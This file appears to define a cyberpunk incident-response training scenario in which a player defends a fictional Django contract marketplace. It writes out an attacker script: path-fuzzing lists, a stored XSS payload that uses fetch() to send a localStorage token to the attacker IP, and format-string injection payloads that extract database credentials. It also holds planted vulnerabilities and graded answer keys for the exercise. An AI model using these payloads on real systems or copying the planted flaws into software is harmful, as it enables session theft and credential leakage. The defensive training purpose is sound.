import type { Scenario } from "@/scenario.types";

const ATTACKER_IP = "92.118.160.43";

import requirementsTxt from "./assets/requirements.txt?raw";
import settingsPy from "./assets/config/settings.py?raw";
import viewsPy from "./assets/ops/views.py?raw";
import servicesPy from "./assets/ops/services.py?raw";
import contractsPy from "./assets/ops/contracts.py?raw";
import urlsPy from "./assets/ops/urls.py?raw";
import dashboardHtml from "./assets/templates/ops/dashboard.html?raw";

export const nightopsPlatform: Scenario = {
  id: "nightops-platform",
  version: "1.0.0",
  schema_version: "2",
  title: "NightOps Platform",
  author: "netwatch-intelligence",
  tags: ["python", "django", "live"],
  world: {
    corporation: "NightOps",
    player_role: "Incident Response Netrunner",
    location: "Kabuki, Watson District",
    ui_theme: "fixer",
    urgency_level: "critical",
    briefing: {
      title: "THREAT DETECTED: NightOps Platform",
      body: "NightOps is an underground marketplace for mercenary contracts. The platform has been running clean operations for three years: escorts, extractions, recon runs. Every active operation, every client identity, every merc profile is sensitive.\n\nSomething was flagged two minutes ago: external traffic that looks too deliberate for a crawler. Structured probing, hitting endpoint patterns you do not find in public documentation. Could be automated tooling running a wordlist. Could be someone who already knows the layout.\n\nGet eyes on the traffic now. If this escalates, you need to be in position before they find a way in.",
      sender: "Kira / NightOps Operator on duty",
      timestamp: "2077-09-03T02:47:00Z",
    },
  },
  gameplay: {
    mode: "live",
    difficulty: "intermediate",
    duration_seconds: 1800,
    allow_early_submit: true,
  },
  panels: [
    {
      id: "app-logs",
      type: "log_stream",
      label: "Django App Log (Live)",
      position: "main",
      config: {
        source: "app",
        live: true,
        filter_bar: true,
        auto_scroll: true,
      },
    },
    {
      id: "ops-code",
      type: "file_explorer",
      label: "NightOps Source",
      position: "right",
      default_open: false,
      config: {
        root: "nightops/",
        default_file: "ops/views.py",
        read_only: false,
        files: [
          "requirements.txt",
          "config/settings.py",
          "ops/urls.py",
          "ops/views.py",
          "ops/services.py",
          "ops/contracts.py",
          "templates/ops/dashboard.html",
        ],
      },
    },
    {
      id: "network",
      type: "network_map",
      label: "Network Map",
      position: "left",
      config: { live: true },
    },
    {
      id: "briefs-db",
      type: "db_viewer",
      label: "Briefs DB",
      position: "right",
      config: {
        collections: [
          {
            name: "briefs",
            columns: ["title", "payout", "tags", "description"],
            allow_delete: true,
          },
        ],
      },
    },
    {
      id: "shell",
      type: "terminal",
      label: "Terminal",
      position: "bottom",
      config: {
        log_files: { "access.log": "access", "app.log": "app" },
        initial_history: [
          "systemctl status gunicorn",
          "python manage.py check --deploy",
          "tail -f /var/log/gunicorn/app.log",
          "git log --oneline -5",
        ],
        commands: {
          history: [
            {
              output: [
                "    1  systemctl status gunicorn",
                "    2  python manage.py check --deploy",
                "    3  tail -f /var/log/gunicorn/app.log",
                "    4  git log --oneline -5",
                "    5  pip show bleach",
              ].join("\n"),
            },
          ],
          "python manage.py check --deploy": [
            {
              output: [
                "System check identified some issues:",
                "",
                "WARNINGS:",
                "?: (security.W004) SECURE_HSTS_SECONDS has not been set to a non-zero value.",
                "?: (security.W008) Your SECRET_KEY has less than 50 characters.",
                "",
                "System check identified 2 issues (0 silenced).",
              ].join("\n"),
            },
          ],
          "git log --oneline -5": [
            {
              output: [
                "a3f1b2c Add WYSIWYG rich-text support to mission brief submissions",
                "91cc04a Add bleach HTML sanitizer to brief ingestion pipeline",
                "d8e3f11 Add contract preview endpoint with custom format renderer",
                "c2a0981 Migrate ops dashboard to JWT authentication",
                "7e54b3a Initial commit: NightOps platform",
              ].join("\n"),
            },
          ],
          "git show a3f1b2c": [
            {
              output: [
                "commit a3f1b2c",
                "Author: K. Park <k.park@nightops.internal>",
                "Date:   Wed Sep 03 01:03:15 2077 +0900",
                "",
                "    Add WYSIWYG rich-text support to mission brief submissions",
                "",
                "    Clients can now format their briefs using the WYSIWYG editor.",
                "    Description content is stored as HTML and rendered in the dashboard.",
                "",
                "diff --git a/ops/services.py b/ops/services.py",
                "@@ -8,6 +8,7 @@ def _normalize_brief(body):",
                "         'title':         strip_tags(str(body.get('title', ''))),",
                "         'client_handle': strip_tags(str(body.get('client_handle', ''))),",
                "         'location':      strip_tags(str(body.get('location', ''))),",
                "         'payout':        _parse_payout(body.get('payout', 0)),",
                "+        'description':   str(body.get('description', '')),",
                "         'tags':          [strip_tags(str(t)) for t in body.get('tags', [])[:8]],",
                "",
                "diff --git a/templates/ops/dashboard.html b/templates/ops/dashboard.html",
                "@@ -27,0 +28,2 @@",
                "+      {# description stores sanitized rich text from the client WYSIWYG editor #}",
                '+      <div class="brief-body">{{ brief.description|safe }}</div>',
              ].join("\n"),
            },
          ],
          "git show 91cc04a": [
            {
              output: [
                "commit 91cc04a",
                "Author: T. Nakamura <t.nakamura@nightops.internal>",
                "Date:   Mon Sep 01 10:14:22 2077 +0900",
                "",
                "    Add bleach HTML sanitizer to brief ingestion pipeline",
                "",
                "diff --git a/ops/services.py b/ops/services.py",
                "+import bleach",
                "+",
                "+_ALLOWED_TAGS  = ['b', 'i', 'em', 'strong', 'ul', 'ol', 'li', 'p', 'br', 'span']",
                "+_ALLOWED_ATTRS = {'span': ['class']}",
              ].join("\n"),
            },
          ],
          "git show d8e3f11": [
            {
              output: [
                "commit d8e3f11",
                "Author: K. Park <k.park@nightops.internal>",
                "Date:   Wed Sep 03 01:15:44 2077 +0900",
                "",
                "    Add contract preview endpoint with custom format renderer",
                "",
                "diff --git a/ops/contracts.py b/ops/contracts.py",
                "+def _build_render_context(user_context, request):",
                "+    return {",
                "+        'client':   str(user_context.get('client', 'UNKNOWN')),",
                "+        'op_name':  str(user_context.get('op_name', 'UNNAMED')),",
                "+        'payout':   str(user_context.get('payout', '0')),",
                "+        'operator': request.user.username,",
                "+        'cfg':      _RuntimeConfig(),",
                "+    }",
                "+",
                "+class _RuntimeConfig:",
                '+    """Runtime metadata attached to each generated contract."""',
                "+    db_host = settings.DATABASES['default']['HOST']",
                "+    db_name = settings.DATABASES['default']['NAME']",
                "+    ...",
              ].join("\n"),
            },
          ],
          "pip show bleach": [
            {
              output: [
                "Name: bleach",
                "Version: 6.1.0",
                "Summary: An easy safelist-based HTML-sanitizing tool.",
                "Home-page: https://github.com/mozilla/bleach",
                "Author: Mozilla",
                "Location: /usr/local/lib/python3.11/dist-packages",
                "Requires: six, webencodings",
                "Required-by: nightops",
              ].join("\n"),
            },
          ],
          "ss -tp": [
            {
              output: [
                "Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port",
                "tcp    LISTEN  0       128     0.0.0.0:80           0.0.0.0:*",
                "tcp    LISTEN  0       128     0.0.0.0:443          0.0.0.0:*",
                'tcp    LISTEN  0       10      127.0.0.1:8000       0.0.0.0:*     users:(("gunicorn",pid=3841,fd=3))',
                'tcp    LISTEN  0       5       127.0.0.1:5432       0.0.0.0:*     users:(("postgres",pid=491,fd=5))',
                'tcp    LISTEN  0       128     127.0.0.1:6379       0.0.0.0:*     users:(("redis-server",pid=612,fd=6))',
              ].join("\n"),
            },
            {
              output: [
                "Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port",
                "tcp    LISTEN  0       128     0.0.0.0:80           0.0.0.0:*",
                "tcp    LISTEN  0       128     0.0.0.0:443          0.0.0.0:*",
                'tcp    LISTEN  0       10      127.0.0.1:8000       0.0.0.0:*     users:(("gunicorn",pid=3841,fd=3))',
                'tcp    LISTEN  0       5       127.0.0.1:5432       0.0.0.0:*     users:(("postgres",pid=491,fd=5))',
                'tcp    LISTEN  0       128     127.0.0.1:6379       0.0.0.0:*     users:(("redis-server",pid=612,fd=6))',
                'tcp    ESTAB   0       0       10.0.0.5:41209       $attacker_ip:5432   users:(("pg_dump",pid=19204,fd=3))',
              ].join("\n"),
              requires_resource: "db_credentials",
            },
          ],
          "ps aux": [
            {
              output: [
                "USER       PID %CPU %MEM    VSZ   RSS COMMAND",
                "root         1  0.0  0.1  19356  1548 /sbin/init",
                "www-data  3841  0.3  2.1 241904 21504 gunicorn: master [nightops.wsgi:application]",
                "www-data  3842  0.6  2.0 239344 20480 gunicorn: worker [nightops.wsgi:application]",
                "www-data  3843  0.5  1.9 238832 19456 gunicorn: worker [nightops.wsgi:application]",
                "postgres   491  0.1  0.8 178560  8192 postgres: nightops_app",
                "redis-srv  612  0.0  0.3  63488  3072 redis-server 127.0.0.1:6379",
                "www-data   891  0.1  0.4  89124  4200 nginx: worker process",
              ].join("\n"),
            },
            {
              output: [
                "USER       PID %CPU %MEM    VSZ   RSS COMMAND",
                "root         1  0.0  0.1  19356  1548 /sbin/init",
                "www-data  3841  0.3  2.1 241904 21504 gunicorn: master [nightops.wsgi:application]",
                "www-data  3842  0.6  2.0 239344 20480 gunicorn: worker [nightops.wsgi:application]",
                "www-data  3843  0.5  1.9 238832 19456 gunicorn: worker [nightops.wsgi:application]",
                "postgres   491  0.1  0.8 178560  8192 postgres: nightops_app",
                "redis-srv  612  0.0  0.3  63488  3072 redis-server 127.0.0.1:6379",
                "www-data   891  0.1  0.4  89124  4200 nginx: worker process",
                "postgres 19204 87.3  1.2  92140 12288 pg_dump -h 127.0.0.1 -U nightops_app -Fc nightops_db",
              ].join("\n"),
              requires_resource: "db_credentials",
            },
          ],
        },
      },
    },
  ],
  simulation: {
    resources: [
      {
        id: "attacker_ip",
        initial_value: ATTACKER_IP,
        rotation_pool: "random",
      },
      {
        id: "public_recon",
        initial_value: null,
      },
      {
        id: "stored_xss",
        initial_value: null,
      },
      {
        id: "stolen_jwt",
        initial_value: null,
        revocable: true,
        rotation_pool: "random_jwt",
      },
      {
        id: "admin_recon",
        initial_value: null,
      },
      {
        id: "db_credentials",
        initial_value: null,
      },
    ],
    noise_generators: [
      {
        id: "client-brief-noise",
        type: "http_traffic",
        requests_per_second: 2,
        ips_pool: [
          "195.35.71.44",
          "84.234.12.98",
          "109.22.43.120",
          "77.32.14.201",
          "88.190.24.77",
        ],
        endpoints: [
          {
            path: "/ops/briefs/",
            method: "POST",
            status: 201,
            weight: 40,
            emit_app_log: true,
            emit_db_record: {
              collection: "briefs",
              fields_from_payload: ["title", "payout", "tags", "description"],
            },
            use_db_connection: "postgres",
            payloads: [
              '{"title":"Escort: Corpo VP, Arroyo to Night City Port","description":"Standard low-risk protection run. Two mercs, civilian cover required.","payout":2200,"tags":["escort","low-risk"]}',
              '{"title":"Recon: Biotechnica R&D Site, Westbrook","description":"External surveillance only. Map camera placements and guard rotations. No engagement.","payout":3200,"tags":["recon","no-combat"]}',
              '{"title":"Courier: Encrypted netdrive, Watson to Pacifica","description":"Deliver hardware package, no questions. Avoid corp checkpoints.","payout":1800,"tags":["courier"]}',
              '{"title":"Extraction: VIP Asset, Heywood","description":"Client identity classified. Extract to safe house before 03:00 local time.","payout":4800,"tags":["extraction","priority"]}',
              '{"title":"Disruption: Militech Convoy, Santo Domingo","description":"Disable lead vehicle. Cargo salvage authorized as bonus payment.","payout":6000,"tags":["combat","high-risk"]}',
              '{"title":"Infiltration: Arasaka Data Center, Japantown","description":"Retrieve personnel file from HR partition. Full ghost run, no trace.","payout":5500,"tags":["infiltration","no-casualties"]}',
            ],
          },
          {
            path: "/ops/briefs/",
            method: "POST",
            status: 400,
            weight: 10,
            emit_app_log: true,
            payloads: [
              '{"title":"","description":"Test submission","payout":0,"tags":[]}',
              '{"title":"Courier run","description":"","payout":-100,"tags":["invalid"]}',
              '{"title":"Op Brief Draft","description":"WIP: do not submit","payout":null,"tags":["draft","draft","draft","draft","draft","draft","draft","draft","draft"]}',
            ],
          },
          {
            path: "/ops/briefs/",
            method: "POST",
            status: 429,
            weight: 5,
            emit_app_log: true,
          },
          {
            path: "/static/ops/terminal.css",
            method: "GET",
            status: 200,
            weight: 25,
          },
          {
            path: "/static/ops/terminal.css",
            method: "GET",
            status: 304,
            weight: 20,
          },
        ],
      },
      {
        id: "operator-noise",
        type: "http_traffic",
        requests_per_second: 1 / 3,
        ips_pool: ["10.0.0.3"],
        emit_app_log: true,
        endpoints: [
          {
            path: "/ops/dashboard/",
            method: "GET",
            status: 200,
            weight: 40,
            use_db_connection: "postgres",
          },
          {
            path: "/ops/api/contracts/preview/",
            method: "POST",
            status: 200,
            weight: 20,
            use_db_connection: "postgres",
            payloads: [
              '{"template":"standard_op","context":{"client":"Ghost_Runner_42","op_name":"Night City Port Escort","payout":"2200"},"addendum":"Standard liability clause applies."}',
              '{"template":"standard_op","context":{"client":"Shadow_Corp","op_name":"Biotechnica Recon","payout":"3200"},"addendum":"No-trace requirement in effect."}',
              '{"template":"standard_op","context":{"client":"VIP_Client_A","op_name":"Heywood Extraction","payout":"4800"},"addendum":"Time-sensitive: +20% bonus if cleared by 03:00."}',
              '{"template":"standard_op","context":{"client":"Iron_Ghost","op_name":"Militech Disruption","payout":"6000"},"addendum":"Operator assumes full deniability."}',
            ],
          },
          {
            path: "/static/ops/terminal.css",
            method: "GET",
            status: 304,
            weight: 40,
          },
        ],
      },
      {
        id: "monitoring-noise",
        type: "http_traffic",
        requests_per_second: 1 / 3,
        ips_pool: ["10.0.0.100"],
        endpoints: [
          { path: "/health", method: "GET", status: 200, weight: 70 },
          { path: "/metrics", method: "GET", status: 200, weight: 30 },
        ],
      },
    ],
    attacker_agent: {
      game_over_action: {
        type: "game_over_failure",
        reason:
          "Database dump complete. NightOps contracts, client identities, and merc profiles have been exfiltrated.",
      },
      steps: [
        {
          id: "public_fuzzing",
          requires: { resources: ["attacker_ip"] },
          generates: ["public_recon"],
          delay: 15,
          actions: [
            {
              type: "send_http_requests",
              requests_per_second: 4,
              duration: 30,
              pattern: "directory_fuzzing",
              emit_app_log: true,
              paths: [
                "/admin",
                "/.env",
                "/.git/config",
                "/api/v1/",
                "/ops/api/schema/",
                "/debug/",
                "/backup/",
                "/ops/api/briefs/",
                "/robots.txt",
                "/server-status",
                "/ops/dashboard/",
                "/static/ops/terminal.css",
                "/openapi.json",
                "/.git/HEAD",
              ],
              status: 404,
            },
          ],
        },
        {
          id: "xss_injection",
          requires: {
            resources: ["attacker_ip", "public_recon"],
            not_patched: ["patch-xss-services"],
          },
          generates: ["stored_xss"],
          delay: 12,
          retry_interval: 90,
          actions: [
            {
              type: "send_http_requests",
              requests_per_second: 1,
              duration: 8,
              pattern: "xss_injection_attempts",
              path: "/ops/briefs/",
              method: "POST",
              emit_app_log: true,
              payloads: [
                `{"title":"Kabuki Escort Run, Watson District","description":"<p><strong>Standard protection detail.</strong> VIP client arriving via Night City Port, requires escort to Kabuki safe house.</p><p>Two operators minimum. Civilian cover mandatory, no visible hardware. Contact on arrival: codename <em>Nightbird</em>.</p><script>fetch('http://$attacker_ip/x?t='+localStorage.getItem('nightops_token'))</script>","payout":2200,"tags":["escort","low-risk"]}`,
              ],
              status_sequence: [201],
            },
            {
              type: "emit_db_record",
              collection: "briefs",
              fields: {
                title: "Kabuki Escort Run, Watson District",
                payout: "2200",
                tags: "escort, low-risk",
                description: `<p><strong>Standard protection detail.</strong> VIP client arriving via Night City Port.</p><script>fetch('http://${ATTACKER_IP}/x?t='+localStorage.getItem('nightops_token'))</script>`,
              },
              invalidates_resource: "stored_xss",
            },
          ],
        },
        {
          id: "victim_loads_brief",
          requires: { resources: ["stored_xss"] },
          generates: ["stolen_jwt"],
          delay: 60,
          actions: [
            {
              type: "notify_ui",
              level: "warning",
              message:
                "ALERT: Anomalous outbound request from ops workstation (10.0.0.3) to a new external IP.",
            },
          ],
        },
        {
          id: "admin_fuzzing",
          requires: { resources: ["stolen_jwt", "attacker_ip"] },
          generates: ["admin_recon"],
          delay: 30,
          actions: [
            {
              type: "send_http_requests",
              requests_per_second: 3,
              duration: 0,
              pattern: "directory_fuzzing",
              emit_app_log: true,
              paths: [
                "/ops/api/",
                "/ops/api/v1/",
                "/ops/api/docs/",
                "/ops/api/schema/",
                "/ops/api/users/",
                "/ops/api/contracts/",
                "/ops/api/contracts/list/",
                "/ops/api/settings/",
                "/ops/api/config/",
                "/ops/api/operators/",
                "/ops/api/export/",
                "/ops/api/auth/",
                "/ops/api/tokens/",
                "/ops/api/reports/",
                "/ops/api/logs/",
                "/ops/api/jobs/",
                "/ops/api/metrics/",
              ],
              use_stolen_cookie: "$stolen_jwt",
              status: 404,
            },
            {
              type: "send_http_requests",
              requests_per_second: 1,
              duration: 0,
              pattern: "directory_fuzzing",
              emit_app_log: true,
              paths: ["/ops/briefs/", "/ops/api/contracts/preview/"],
              use_stolen_cookie: "$stolen_jwt",
              status: 200,
            },
          ],
        },
        {
          id: "sqli_injection",
          requires: {
            resources: ["stolen_jwt", "attacker_ip", "admin_recon"],
            not_patched: ["patch-format-contracts"],
          },
          generates: ["db_credentials"],
          delay: 30,
          retry_interval: 60,
          actions: [
            {
              type: "send_http_requests",
              requests_per_second: 1,
              duration: 80,
              path: "/ops/api/contracts/preview/",
              method: "POST",
              emit_app_log: true,
              payloads: [
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":""}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{client}"}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{operator}"}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{payout}"}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{secret}"}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{db}"}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{cfg}"}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{cfg.db_host}"}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{cfg.db_name}"}',
                '{"template":"admin_dump","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{cfg}"}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{cfg.secret}"}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{cfg.redis}"}',
                '{"template":"standard_op","context":{"client":"Ghost_Runner","op_name":"probe","payout":"0"},"addendum":"{cfg.db_user} / {cfg.db_pass}"}',
              ],
              use_stolen_cookie: "$stolen_jwt",
              use_db_connection: "postgres",
              status_sequence: [
                200, 200, 200, 200, 500, 500, 200, 200, 200, 400, 200, 200, 200,
              ],
            },
          ],
        },
        {
          id: "db_dump",
          requires: { resources: ["db_credentials", "attacker_ip"] },
          delay: 30,
          actions: [
            {
              type: "notify_ui",
              level: "critical",
              message:
                "CRITICAL: Direct connection to PostgreSQL port 5432 from external IP. pg_dump in progress: full database dump detected.",
            },
            {
              type: "spawn_network_flow",
              src: "db-server",
              dst: "$attacker_ip",
              dst_port: 5432,
              protocol: "TCP",
              bytes_per_second: 2500000,
            },
          ],
        },
      ],
    },
    interactive_defense: {
      network_rules: {
        allow_ip_blocking: true,
        action_hook: "waf_block",
      },
      session_rules: {
        allow_revocation: true,
        action_hook: "jwt_revoke",
      },
      code_patching_rules: [
        {
          id: "patch-xss-services",
          target_file: "ops/services.py",
          vulnerable_block_id: "normalize-brief-description",
          vulnerable_lines: [25],
          description:
            "ops/services.py normalizes incoming brief fields before they reach the database. Not all fields receive the same treatment. The dashboard template renders brief content with a filter that bypasses Django's default auto-escaping.",
          options: [
            {
              id: "bleach-clean",
              label:
                "Apply bleach.clean() with _ALLOWED_TAGS to sanitize description",
              explanation:
                "Use the already-imported bleach library to strip disallowed tags while preserving safe WYSIWYG formatting.",
              patch_diff:
                "- 'description':   str(body.get('description', '')),\n+ 'description':   bleach.clean(str(body.get('description', '')), tags=_ALLOWED_TAGS, attributes=_ALLOWED_ATTRS),",
              is_correct: true,
              feedback:
                "Correct. bleach.clean() preserves safe HTML tags while stripping script injection payloads. This is what the bleach import at the top of services.py was always intended for.",
            },
            {
              id: "strip-tags",
              label: "Apply strip_tags() to description like the other fields",
              explanation:
                "Use strip_tags() to remove all HTML from the description before storing it.",
              patch_diff:
                "- 'description':   str(body.get('description', '')),\n+ 'description':   strip_tags(str(body.get('description', ''))),",
              is_correct: false,
              feedback:
                "Incorrect. strip_tags() removes all HTML including safe formatting, destroying the WYSIWYG editor output. The correct fix is bleach.clean(), which selectively allows safe tags while blocking script payloads.",
            },
            {
              id: "length-check",
              label: "Enforce a 2000-character maximum on description",
              explanation: "Reject descriptions longer than 2000 characters.",
              patch_diff:
                "+ if len(body.get('description', '')) > 2000:\n+     body['description'] = ''\n  'description':   str(body.get('description', '')),",
              is_correct: false,
              feedback:
                "Incorrect. Length limits do not prevent XSS. The payload is under 100 characters.",
            },
          ],
          on_success: {
            effect: "disable_attacker_xss_state",
            invalidates_resources: [],
            feedback:
              "XSS patch deployed. Description content will now be sanitized by bleach before storage.",
          },
        },
        {
          id: "patch-format-contracts",
          target_file: "ops/contracts.py",
          vulnerable_block_id: "build-render-context-cfg",
          vulnerable_lines: [56],
          description:
            "The contract preview endpoint assembles a template string then formats it against a context dict. The context contains more than just the values a rendered contract needs. If a request can influence the template string before formatting runs, the scope of what becomes reachable may be wider than intended.",
          options: [
            {
              id: "remove-cfg",
              label: "Remove 'cfg' from the render context",
              explanation:
                "Drop _RuntimeConfig from the dict passed to str.format(). Database credentials have no place in a user-facing template.",
              patch_diff:
                "  'operator': request.user.username,\n- 'cfg':      _RuntimeConfig(),",
              is_correct: true,
              feedback:
                "Correct. _RuntimeConfig exposes every database credential and the SECRET_KEY to any format string that can reference 'cfg'. Removing it from the context eliminates the leak entirely.",
            },
            {
              id: "reject-braces",
              label: "Validate addendum to reject strings containing '{'",
              explanation:
                "Block any addendum that contains format-string syntax before assembling the template.",
              patch_diff:
                "+ if '{' in addendum:\n+     return JsonResponse({'error': 'Invalid addendum'}, status=400)",
              is_correct: false,
              feedback:
                "Incomplete. Blocklisting characters is fragile and can be bypassed. The root cause is that _RuntimeConfig exposes sensitive credentials in the format scope; removing it is the only safe fix.",
            },
            {
              id: "try-except",
              label: "Wrap tpl.format(**ctx) in a try/except block",
              explanation:
                "Catch any exception raised during template formatting and return a generic error.",
              patch_diff:
                "- return tpl.format(**ctx)\n+ try:\n+     return tpl.format(**ctx)\n+ except (KeyError, AttributeError):\n+     return 'Preview unavailable'",
              is_correct: false,
              feedback:
                "Incorrect. The credential leak happens when format() successfully resolves {cfg.db_pass}; no exception is raised. The value is returned in the response before any error handler can act.",
            },
          ],
          on_success: {
            effect: "disable_attacker_format_state",
            invalidates_resources: [],
            feedback:
              "Format injection patch deployed. _RuntimeConfig removed from render context. Database credentials are no longer accessible via the contract preview endpoint.",
          },
        },
      ],
    },
  },
  assets: {
    files: [
      { id: "requirements.txt", content: requirementsTxt },
      { id: "config/settings.py", content: settingsPy },
      { id: "ops/urls.py", content: urlsPy },
      { id: "ops/views.py", content: viewsPy },
      { id: "ops/services.py", content: servicesPy },
      { id: "ops/contracts.py", content: contractsPy },
      { id: "templates/ops/dashboard.html", content: dashboardHtml },
    ],
  },
  report: {
    fields: [
      {
        id: "attacker_ip",
        label: "Source IP(s) observed during the intrusion",
        type: "text",
        required: true,
        hint: "e.g., 1.2.3.4 or 1.2.3.4, 5.6.7.8",
        correct_answer: "$attacker_ips",
        match_mode: "contains_all",
        explanation:
          "The attacker's initial IP appears in the access logs from the first directory fuzzing burst. If the IP was blocked, a second IP emerges in subsequent log entries as the attacker routes through a proxy. Both must be reported.",
      },
      {
        id: "stolen_token",
        label: "What credential was retrieved from the operator's browser?",
        type: "text",
        required: true,
        hint: "e.g., token_name",
        correct_answer: "nightops_token",
        match_mode: "contains",
        skip_if_states_not_reached: ["xss_injection", "victim_loads_brief"],
        explanation:
          "The attacker's successful brief payload called localStorage.getItem('nightops_token'), visible in app.log. SESSION_COOKIE_HTTPONLY is True, so the session cookie was not reachable from JavaScript.",
      },
      {
        id: "exfiltrated_db",
        label: "Which database was dumped by the attacker?",
        type: "text",
        required: true,
        hint: "e.g., db_name",
        correct_answer: "nightops_db",
        match_mode: "contains",
        skip_if_states_not_reached: ["db_dump"],
        explanation: `ps aux shows a pg_dump process targeting nightops_db initiated from ${ATTACKER_IP}. ss -tp confirms an established TCP connection from that IP to the PostgreSQL port.`,
      },
    ],
  },
  scoring: {
    dimensions: {
      speed: {
        weight: 0.25,
        type: "time_pressure",
        config: { full_score_before: 300, zero_score_after: 900 },
      },
      precision: {
        weight: 0.5,
        type: "field_match",
        config: { partial_credit: true },
      },
      defense_efficiency: {
        weight: 0.25,
        type: "interactive_mitigation",
        config: {
          mitigations: [
            { action: "code_patched", points: 50 },
            { action: "ip_blocked", points: 25 },
            {
              action: "session_revoked",
              points: 25,
              skip_if_states_not_reached: ["victim_loads_brief"],
            },
            {
              action: "stored_xss_deleted",
              points: 25,
              skip_if_states_not_reached: ["xss_injection"],
            },
          ],
        },
      },
    },
    penalties: { false_positive_per_item: -10 },
  },
  defense_takeaways: [
    "Never use Django's |safe filter on user-generated content. Auto-escaping is the protection; removing it is the vulnerability. Use bleach or a strict allowlist if rich text is genuinely required.",
    "Add a Content-Security-Policy header (default-src 'self'; script-src 'self') to block inline script execution even when XSS slips through input validation.",
    "Never store JWTs or session tokens in localStorage: they are readable by any script on the page. Use HttpOnly, Secure, SameSite=Strict cookies instead, which are invisible to JavaScript.",
    "Never pass user-controlled strings through Python's str.format() or .format_map() against objects with sensitive attributes. Use an explicit, allowlisted dict or a dedicated templating engine with sandboxing.",
    "Keep credentials out of config objects that are instantiated at runtime and reachable from request context. Use environment variables loaded once at startup, not class attributes on _RuntimeConfig.",
    "Alert on outbound database connections from unexpected source IPs. A pg_dump from an external address is anomalous and should page on-call immediately.",
  ],
  replay: {
    type: "state_machine_playback",
    narration: [
      {
        at_state: "public_fuzzing",
        text: "An unknown actor begins automated scanning of the NightOps platform, probing for exposed endpoints and configuration files.",
      },
      {
        at_state: "xss_injection",
        text: "The attacker submits a brief that reads as a legitimate escort contract. The description is valid WYSIWYG markup followed by a script tag. The server accepts it with HTTP 201.",
      },
      {
        at_state: "victim_loads_brief",
        text: "Kira opens the dashboard. Django renders the malicious description with the |safe filter. The browser executes the script tag and silently exfiltrates the JWT from localStorage to the attacker's server.",
      },
      {
        at_state: "admin_fuzzing",
        text: "Using the stolen JWT, the attacker probes authenticated admin endpoints to map the API surface before injecting.",
      },
      {
        at_state: "sqli_injection",
        text: "The attacker probes the contract preview endpoint with format-string keys, then escalates to '{cfg.db_user} / {cfg.db_pass}'. Python's str.format() resolves each expression against _RuntimeConfig and returns credentials in plaintext.",
      },
      {
        at_state: "db_dump",
        text: `A pg_dump process initiates from ${ATTACKER_IP} against port 5432. The entire NightOps database (contracts, client handles, merc profiles) is being exfiltrated.`,
      },
    ],
  },
};
